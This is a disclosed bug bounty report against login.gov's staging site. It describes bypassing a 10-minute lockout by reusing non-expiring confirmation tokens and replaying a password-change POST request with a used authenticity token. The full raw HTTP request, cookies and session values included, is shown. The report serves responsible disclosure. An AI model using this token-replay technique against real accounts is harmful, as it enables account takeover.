# 2FA bypass - confirmation tokens don't expire

## Report Details
- **Report ID**: 264090
- **URL**: https://hackerone.com/reports/264090
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-08-28T16:40:36.583Z
- **Disclosed**: 2017-11-17T18:14:48.684Z

## Reporter
- **Username**: muskecan
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
Hi there,

Because of the limitation of the site, accounts may be locked down for 10 minutes. I found 2 ways to bypass this lock period.

First one with the confirmation mail that we get when we sign on. 

If we get the token this way below, we can change account password and bypass the lock period at once.

https://idp.staging.login.gov/sign_up/enter_password?confirmation_token=XXXXXX

*XXXXXX= Confirmation token of your account.

Second one is with a POST request below.

POST /manage/password HTTP/1.1
Host: staging.login.gov
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 219
Referer: https://staging.login.gov/manage/password
Cookie: AWSALB=KkPbvp72NJDrfqzjC97hdllLC4+QMrw8qZXTGzNevDGz3y9nFRrtIyjghxsefOUKkaG2BJX5yhTOY71u+rgMVk5IDaL8G/90affS6zBZBbAOEqqGSp7fYSALOOEL; ahoy_visitor=345467de-0fb9-4154-af8f-329ba5d72408; ahoy_visit=62bcef39-2994-4866-92c8-d21895411c10; ahoy_track=true; _upaya_session=1b94772c05e0dbad70348c3db1f3ccf8; _ga=GA1.2.1438978135.1503936076; _gid=GA1.2.1732157595.1503936076; _ga=GA1.3.1438978135.1503936076; _gid=GA1.3.1732157595.1503936076
Connection: close
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&_method=patch&authenticity_token=bGs%2FBZHewYdpRsyPIe108KMc2sR1mK9SL1bbi0X%2F9IYZDJ%2Bh3SpUN79l84qk%2FXZS1%2Fx6Nd9VBVR%2BNCR2a95NZQ%3D%3D&update_user_password_form%5Bpassword%5D=test_?123%2B&commit=Update

If we get an used authenticity_token, we can still change the password and bypass the lock period at once.

King Regards.


## Attachments
- password_change.png
